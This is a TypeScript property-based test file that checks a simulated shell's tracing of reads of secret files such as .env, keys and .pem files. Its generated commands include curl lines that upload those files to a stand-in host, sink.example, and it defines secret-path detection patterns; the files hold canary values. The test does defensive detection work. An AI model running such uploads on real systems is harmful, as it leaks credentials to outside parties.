import fc from 'fast-check';
import { describe, expect, it } from 'vitest';
import { runLine } from '../src/shell/interpret.js';
import { createRunTrace } from '../src/shell/run-trace.js';
import type { Entry } from '../src/state.js';
import { TraceBuilder } from '../src/trace.js';
import { NUM_RUNS, PBT_TIMEOUT } from './pbt-config.js';
import { makeTestEnv } from './support/env.js';
import './support/setup.js';

// Each property failure prints the fast-check seed and counterexample (fc.assert report).

const FILES = [
  '.env',
  '.ENV',
  'a.txt',
  'notes/b.txt',
  'secrets/x.txt',
  'Secrets/y.txt',
  'k.key',
  'id.KEY',
  'sub/k.key',
  'deep/er/c.pem',
  'c.PEM',
  'src/main.ts',
];
const DIRS = ['notes', 'secrets', 'Secrets', 'sub', 'deep', 'deep/er', 'src'];
const MISSING = 'nope/missing.txt';

/** Independent oracle per pattern (all patterns are case-insensitive, anchored, with an implicit tail). */
const PATTERNS: Record<string, (path: string) => boolean> = {
  '.env': (p) => p.toLowerCase().split('/')[0] === '.env',
  secrets: (p) => p.toLowerCase().split('/')[0] === 'secrets',
  '*.key': (p) => (p.toLowerCase().split('/')[0] as string).endsWith('.key'),
  '**/*.pem': (p) => p.toLowerCase().split('/').some((s) => s.endsWith('.pem')),
};

interface Cmd {
  text: string;
  /** Existing file paths the command reads, in order. */
  reads: string[];
  exit: number;
}

const encoder = new TextEncoder();

function filesUnder(dir: string, present: readonly string[]): string[] {
  return present.filter((f) => f.startsWith(`${dir}/`));
}

const arbCmd = (present: readonly string[], fresh: () => string): fc.Arbitrary<Cmd> => {
  const existing = fc.constantFrom(...present);
  const target = fc.oneof({ weight: 5, arbitrary: existing }, { weight: 1, arbitrary: fc.constant(MISSING) });
  const has = (t: string): boolean => present.includes(t);
  const dirs = DIRS.filter((d) => filesUnder(d, present).length > 0);
  const alts: fc.Arbitrary<Cmd>[] = [
    target.map((t) => ({ text: `cat ${t}`, reads: has(t) ? [t] : [], exit: has(t) ? 0 : 1 })),
    target.map((t) => ({
      text: `cp ${t} ${fresh()}`,
      reads: has(t) ? [t] : [],
      exit: has(t) ? 0 : 1,
    })),
    target.map((t) => ({
      text: `curl -d @${t} http://sink.example/`,
      reads: has(t) ? [t] : [],
      exit: has(t) ? 7 : 26,
    })),
    target.map((t) => ({
      text: `curl --data-binary @${t} https://sink.example:8443/up`,
      reads: has(t) ? [t] : [],
      exit: has(t) ? 7 : 26,
    })),
    existing.map((t) => ({ text: `sqlite3 ${t} 'select 1'`, reads: [t], exit: 1 })),
  ];
  if (dirs.length > 0) {
    alts.push(
      fc.constantFrom(...dirs).map((d) => ({
        text: `cp -r ${d} ${fresh()}`,
        reads: filesUnder(d, present),
        exit: 0,
      })),
    );
  }
  return fc.oneof(...alts);
};

interface Step {
  line: string;
  viaNpm: boolean;
  reads: string[];
}

/** Evaluates a line of `;` / `&&` connected commands like the interpreter: && skips after a nonzero exit. */
function arbStep(present: readonly string[], fresh: () => string): fc.Arbitrary<Step> {
  const cmd = arbCmd(present, fresh);
  return fc
    .record({
      first: cmd,
      rest: fc.array(fc.record({ connector: fc.constantFrom(';', '&&'), cmd }), { maxLength: 4 }),
      viaNpm: fc.boolean(),
    })
    .map(({ first, rest, viaNpm }) => {
      const reads: string[] = [];
      let line = first.text;
      let exit = first.exit;
      reads.push(...first.reads);
      for (const { connector, cmd: c } of rest) {
        line += ` ${connector} ${c.text}`;
        if (connector === '&&' && exit !== 0) continue;
        reads.push(...c.reads);
        exit = c.exit;
      }
      return { line, viaNpm, reads };
    });
}

const arbCase = fc
  .subarray(FILES, { minLength: 1 })
  .chain((present) => {
    let n = 0;
    const fresh = (): string => `out${n++}.copy`;
    return fc.record({
      present: fc.constant(present),
      patterns: fc.subarray(Object.keys(PATTERNS)),
      steps: fc.array(arbStep(present, fresh), { minLength: 1, maxLength: 3 }),
    });
  });

/** Destination names come from a generation-time counter; rewrite every `outN.copy` destination to a unique, increasing name across the whole plan. */
function uniqueDestinations(steps: Step[]): Step[] {
  let n = 0;
  return steps.map((s) => ({ ...s, line: s.line.replace(/out\d+\.copy/g, () => `out${n++}.copy`) }));
}

describe('Property 15: Secret reads are recorded by pattern, once per step', () => {
  it(
    'a secret-read event exists for a path iff a pattern matches; unique per (step, path); stepIndex is the action index',
    async () => {
      // Feature: ghost-shell, Property 15: Secret reads are recorded by pattern, once per step
      // **Validates: Requirements 7.3, 7.4, 7.5**
      await fc.assert(
        fc.asyncProperty(arbCase, async ({ present, patterns, steps: rawSteps }) => {
          const steps = uniqueDestinations(rawSteps);
          const entries: Record<string, Entry> = {};
          for (const d of DIRS) entries[d] = { kind: 'dir' };
          for (const f of present) entries[f] = { kind: 'file', bytes: encoder.encode('canary') };
          const scripts: Record<string, string> = {};
          steps.forEach((s, i) => {
            scripts[`s${i}`] = s.line;
          });
          entries['package.json'] = { kind: 'file', bytes: encoder.encode(JSON.stringify({ scripts })) };

          const { env } = makeTestEnv(entries);
          const builder = new TraceBuilder();
          for (const [i, step] of steps.entries()) {
            const action = step.viaNpm ? `npm run s${i}` : step.line;
            await runLine(action, { ...env, stepIndex: i, trace: createRunTrace(builder, i, patterns) });
          }

          const events = builder.build().events.filter((e) => e.kind === 'secret-read');
          const matches = (p: string): boolean => patterns.some((k) => (PATTERNS[k] as (x: string) => boolean)(p));

          // Unique per (stepIndex, path).
          const keys = events.map((e) => `${e.stepIndex}\u0000${e.path}`);
          expect(new Set(keys).size).toBe(keys.length);

          // Per step: exactly the distinct matching paths read in that step, nothing from other indexes.
          for (const e of events) expect(e.stepIndex).toBeLessThan(steps.length);
          for (const [i, step] of steps.entries()) {
            const expected = [...new Set(step.reads.filter(matches))].sort();
            const actual = events
              .filter((e) => e.stepIndex === i)
              .map((e) => e.path)
              .sort();
            expect(actual).toEqual(expected);
          }
          if (patterns.length === 0) expect(events).toEqual([]);
        }),
        { numRuns: NUM_RUNS },
      );
    },
    PBT_TIMEOUT,
  );

  it('fixed example: cat of a matching file records one event at its step index', async () => {
    const { env } = makeTestEnv({ '.env': { kind: 'file', bytes: encoder.encode('sk-CANARY-abc123') } });
    const builder = new TraceBuilder();
    await runLine('cat .env ; cat .env', { ...env, stepIndex: 2, trace: createRunTrace(builder, 2, ['.env']) });
    expect(builder.build().events).toEqual([{ kind: 'secret-read', path: '.env', stepIndex: 2 }]);
  });
});
